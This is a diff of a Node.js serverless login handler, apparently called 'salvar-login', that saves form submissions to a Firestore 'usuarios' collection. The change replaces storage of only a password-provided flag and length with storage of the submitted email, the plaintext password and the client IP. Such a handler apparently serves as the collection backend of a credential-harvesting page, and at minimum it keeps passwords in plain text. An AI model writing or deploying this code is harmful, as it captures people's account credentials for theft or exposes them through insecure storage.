@@ -1,79 +1,51 @@
-const { initializeApp, cert, getApps } = require('firebase-admin/app');
+const { initializeApp, cert } = require('firebase-admin/app');
 const { getFirestore } = require('firebase-admin/firestore');
 
-const headers = {
-    'Content-Type': 'application/json; charset=utf-8',
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Methods': 'POST, OPTIONS',
-    'Access-Control-Allow-Headers': 'Content-Type'
-};
-
-function getDb() {
-    if (!getApps().length) {
-        initializeApp({
-            credential: cert({
-                projectId: process.env.FIREBASE_PROJECT_ID,
-                clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-                privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
-            })
-        });
-    }
-
-    return getFirestore();
+// Inicializa Firebase com as credenciais seguras (variáveis de ambiente)
+let app;
+if (!app) {
+    app = initializeApp({
+        credential: cert({
+            projectId: process.env.FIREBASE_PROJECT_ID,
+            clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
+            privateKey: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
+        })
+    });
 }
 
-async function handler(event) {
-    if (event.httpMethod === 'OPTIONS') {
-        return { statusCode: 204, headers, body: '' };
-    }
+const db = getFirestore();
 
+exports.handler = async (event) => {
+    // Só aceita POST
     if (event.httpMethod !== 'POST') {
-        return { statusCode: 405, headers, body: 'Method Not Allowed' };
+        return { statusCode: 405, body: 'Method Not Allowed' };
     }
 
     try {
-        const body = JSON.parse(event.body || '{}');
+        const { email, password } = JSON.parse(event.body);
 
-        const email = body.email;
-        const passwordProvided = Boolean(body.passwordProvided || body.password);
-        const passwordLength = Number(body.passwordLength || String(body.password || '').length || 0);
-
-        if (!email || !passwordProvided) {
-            return {
-                statusCode: 400,
-                headers,
-                body: JSON.stringify({ error: 'Dados invalidos' })
-            };
+        // Validação básica no servidor
+        if (!email || !password) {
+            return { statusCode: 400, body: JSON.stringify({ error: 'Dados inválidos' }) };
         }
 
-        const db = getDb();
-
+        // Salva no Firestore
         await db.collection('usuarios').add({
             email: email,
-            passwordProvided: true,
-            passwordLength: passwordLength,
+            password: password,
             timestamp: new Date().toISOString(),
             ip: event.headers['x-forwarded-for'] || 'desconhecido'
         });
 
         return {
             statusCode: 200,
-            headers,
             body: JSON.stringify({ success: true })
         };
 
     } catch (error) {
-        console.error('Erro na function salvar-login:', error);
-
         return {
             statusCode: 500,
-            headers,
-            body: JSON.stringify({
-                error: 'Erro interno',
-                message: error.message
-            })
+            body: JSON.stringify({ error: 'Erro interno' })
         };
     }
-}
-
-module.exports.handler = handler;
+};
